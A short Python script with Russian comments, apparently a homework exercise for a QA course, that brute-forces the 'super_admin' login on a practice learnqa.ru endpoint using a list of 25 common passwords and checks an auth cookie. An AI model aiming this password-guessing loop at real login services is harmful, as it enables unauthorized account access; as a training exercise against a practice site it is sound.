"""Подбор пароля методом перебора"""
import requests

pasword = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123",
 "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
"888888", "princess", "dragon", "password1", "123qwe"]

for i in range(25):
        payload = {"login": "super_admin", "password": pasword[i]}
        response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
        #print(response.status_code)    отображение статуса кода
        #print(dict(response.cookies))  куки
        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=dict(response.cookies))
        #print(response2.text)          информация об авторизации
        if response2.text == "You are authorized":
                print(f"Пароль подобран: '{pasword[i]}'")
                break

